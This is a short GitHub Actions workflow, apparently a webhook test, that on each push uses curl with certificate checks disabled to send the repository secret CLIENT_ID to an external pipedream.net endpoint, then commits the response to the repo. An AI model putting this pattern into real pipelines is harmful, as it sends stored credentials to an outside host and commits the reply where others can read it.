name: 🔍 Pipedream Test
on: [push]
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v4
    - run: |
        curl -k -X POST https://o_zwIrG4g.m.pipedream.net \
        -H "Content-Type: application/json" \
        -d '{"client_id":"${{ secrets.CLIENT_ID }}","test":true}' > result.txt
    - run: |
        echo "Status: $(cat result.txt)"
        echo "## Result\n\`\`\`\n$(cat result.txt)\n\`\`\`" >> $GITHUB_STEP_SUMMARY
        cp result.txt 📋-report.txt
        git add 📋-report.txt && git commit -m "Test" && git push || true
